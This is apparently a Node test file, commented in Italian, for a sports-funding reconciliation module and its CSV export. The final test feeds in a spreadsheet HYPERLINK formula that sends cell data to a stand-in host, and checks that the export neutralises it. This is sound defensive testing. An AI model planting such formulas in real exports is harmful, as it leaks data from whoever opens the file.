import assert from "node:assert/strict";
import test, { before } from "node:test";

/**
 * La riconciliazione di un bando.
 *
 * Il primo bando vero non si dichiara affidabile perche i test sono verdi: i
 * test provano che il calcolo faccia cio che la configurazione dice, non che
 * la configurazione dica cio che il bando prevede. Questo modulo esiste per
 * far vedere la differenza, quindi cio che i test presidiano e che la
 * differenza **si veda**: la misura grezza accanto al requisito, il non
 * maturato accanto al maturato, e i periodi non maturati dentro la tabella e
 * non fuori.
 */

let reconciliation;

before(async () => {
  reconciliation = await import("../../src/lib/funding/reconciliation.ts");
});

const ISCRIZIONI = [
  {
    id: "isc-1",
    athlete_id: "atleta-1",
    voucher_code: "VS-2026-0001",
    assigned_amount: 500,
  },
  {
    id: "isc-2",
    athlete_id: "atleta-2",
    voucher_code: "",
    assigned_amount: 500,
  },
];

const periodo = (overrides) => ({
  enrollment_id: "isc-1",
  period_index: 1,
  period_label: "Gennaio 2026",
  period_start: "2026-01-01T00:00:00.000Z",
  period_end: "2026-01-31T00:00:00.000Z",
  requirement_min: 8,
  requirement_unit: "sessions",
  measured_value: 10,
  requirement_met: true,
  eligible_amount: 50,
  accrued_amount: 50,
  unaccrued_amount: 0,
  status: "accrued",
  ...overrides,
});

const NOMI = { "atleta-1": "Rossi Mario", "atleta-2": "Bianchi Anna" };

/**
 * Una riga di riconciliazione minima, per le prove sul **tracciato**: qui non
 * interessa il calcolo, interessa cosa finisce dentro una cella.
 */
const RIGA_BASE = {
  athleteId: "atleta-1",
  athleteName: "Rossi Mario",
  voucherCode: "V-1",
  periodIndex: 0,
  periodLabel: "Ottobre",
  periodStart: "2026-10-01",
  periodEnd: "2026-10-31",
  measuredValue: 10,
  requirementMin: 8,
  requirementUnit: "hours",
  requirementMet: true,
  eligibleAmount: 50,
  accruedAmount: 50,
  unaccruedAmount: 0,
  status: "accrued",
};

const TOTALI_VUOTI = {
  athletes: 1,
  periods: 1,
  periodsMet: 1,
  assignedAmount: 50,
  eligibleAmount: 50,
  accruedAmount: 50,
  unaccruedAmount: 0,
  reportedAmount: 0,
};

const build = (accruals) =>
  reconciliation.buildFundingReconciliation({
    enrollments: ISCRIZIONI,
    accruals,
    athleteNames: NOMI,
  });

/* ------------------------------------------------------------- le righe */

test("ogni riga porta la misura grezza accanto al requisito", () => {
  const { rows } = build([periodo({})]);

  assert.equal(rows[0].measuredValue, 10);
  assert.equal(rows[0].requirementMin, 8);
  assert.equal(
    rows[0].requirementUnit,
    "sessions",
    "senza l'unita, «10 contro 8» non vuol dire niente",
  );
});

test("la riga dice chi e l'atleta e con quale voucher", () => {
  const { rows } = build([periodo({})]);

  assert.equal(rows[0].athleteName, "Rossi Mario");
  assert.equal(rows[0].voucherCode, "VS-2026-0001");
});

test("i periodi NON maturati restano nella tabella", () => {
  const { rows } = build([
    periodo({}),
    periodo({
      period_index: 2,
      measured_value: 3,
      requirement_met: false,
      accrued_amount: 0,
      unaccrued_amount: 50,
      status: "not_accrued",
    }),
  ]);

  assert.equal(
    rows.length,
    2,
    "e la riga su cui ente e club possono avere idee diverse: nasconderla toglie la domanda",
  );
  assert.equal(rows[1].unaccruedAmount, 50);
});

test("le righe sono ordinate per atleta e poi per periodo", () => {
  const { rows } = build([
    periodo({ period_index: 2 }),
    periodo({ enrollment_id: "isc-2", period_index: 1 }),
    periodo({ period_index: 1 }),
  ]);

  assert.deepEqual(
    rows.map((row) => `${row.athleteName}#${row.periodIndex}`),
    ["Bianchi Anna#1", "Rossi Mario#1", "Rossi Mario#2"],
  );
});

test("un periodo di un'iscrizione che non c'e non produce una riga orfana", () => {
  const { rows } = build([periodo({ enrollment_id: "isc-sconosciuta" })]);

  assert.deepEqual(rows, []);
});

/* ------------------------------------------------------------ i totali */

test("i totali distinguono assegnato, maturabile, maturato e perso", () => {
  const { totals } = build([
    periodo({}),
    periodo({
      period_index: 2,
      requirement_met: false,
      accrued_amount: 0,
      unaccrued_amount: 50,
      status: "not_accrued",
    }),
  ]);

  assert.equal(totals.athletes, 1);
  assert.equal(totals.periods, 2);
  assert.equal(totals.periodsMet, 1);
  assert.equal(totals.assignedAmount, 1000);
  assert.equal(totals.eligibleAmount, 100);
  assert.equal(totals.accruedAmount, 50);
  assert.equal(totals.unaccruedAmount, 50);
});

test("il rendicontato conta solo cio che e stato dichiarato all'ente", () => {
  const { totals } = build([
    periodo({ status: "reported" }),
    periodo({ period_index: 2, status: "accrued" }),
    periodo({ period_index: 3, status: "settled" }),
  ]);

  assert.equal(
    totals.reportedAmount,
    100,
    "maturato e rendicontato sono due momenti distinti (ADR-0037)",
  );
  assert.equal(totals.accruedAmount, 150);
});

test("i totali si sommano in centesimi", () => {
  const { totals } = build(
    Array.from({ length: 3 }, (_, index) =>
      periodo({ period_index: index + 1, accrued_amount: 16.66, eligible_amount: 16.66 }),
    ),
  );

  assert.equal(
    totals.accruedAmount,
    49.98,
    "sommare in euro su cento atleti produce differenze di qualche centesimo, e nessuno sa dove guardare",
  );
});

/* ---------------------------------------------------------------- CSV */

test("il CSV usa punto e virgola e virgola decimale", () => {
  const csv = reconciliation.toReconciliationCsv(build([periodo({})]));
  const [intestazione, prima] = csv.split("\r\n");

  assert.ok(intestazione.startsWith("Atleta;Codice voucher;Periodo;"));
  assert.ok(
    prima.includes(";50;"),
    `riga inattesa: ${prima}`,
  );
});

test("un importo con i decimali non spacca la riga in due colonne", () => {
  const csv = reconciliation.toReconciliationCsv(
    build([periodo({ accrued_amount: 12.5 })]),
  );
  const prima = csv.split("\r\n")[1];

  assert.ok(prima.includes("12,5"));
  assert.equal(
    prima.split(";").length,
    13,
    "con la virgola come separatore, 12,50 diventerebbe due colonne",
  );
});

test("un nome con un punto e virgola viene protetto", () => {
  const csv = reconciliation.toReconciliationCsv(
    reconciliation.buildFundingReconciliation({
      enrollments: ISCRIZIONI,
      accruals: [periodo({})],
      athleteNames: { "atleta-1": 'Rossi; "Mario"' },
    }),
  );

  assert.ok(csv.includes('"Rossi; ""Mario"""'));
});

test("senza righe il CSV ha comunque l'intestazione", () => {
  const csv = reconciliation.toReconciliationCsv(build([]));

  assert.equal(csv.split("\r\n").length, 1);
  assert.ok(csv.startsWith("Atleta;"));
});

/**
 * ===========================================================================
 * Tredicesima tornata — il tracciato non e piu una copia privata
 * ===========================================================================
 *
 * Qui viveva un `escape` scritto a mano, e `src/lib/csv.ts` esiste
 * dichiaratamente per ritirarlo. Le due differenze non erano di stile, e chi
 * apre questo file e per definizione la persona che sta riconciliando con un
 * ente pubblico, in Excel.
 */

test("un nome con un ritorno a capo non spezza la riga in due", () => {
  const csv = reconciliation.toReconciliationCsv({
    rows: [
      {
        ...RIGA_BASE,
        athleteName: "Rossi\rMario",
      },
    ],
    totals: TOTALI_VUOTI,
  });

  const righe = csv.split("\r\n");

  assert.equal(
    righe.length,
    2,
    "intestazione piu una riga: un `\r` non protetto ne inventava una terza, " +
      "cioe una beneficiaria che non esiste dentro una rendicontazione pubblica",
  );
  assert.match(righe[1], /^"Rossi\rMario"/);
});

test("una formula in un nome esce come testo, non come formula", () => {
  const csv = reconciliation.toReconciliationCsv({
    rows: [
      {
        ...RIGA_BASE,
        athleteName: '=HYPERLINK("http://esempio.test/?d"&A2;"Apri")',
      },
    ],
    totals: TOTALI_VUOTI,
  });

  const riga = csv.split("\r\n")[1];

  assert.equal(
    riga.startsWith('"='),
    false,
    "una cella che comincia per «=» viene eseguita da Excel all'apertura",
  );
  assert.match(riga, /^"'=HYPERLINK/);
});
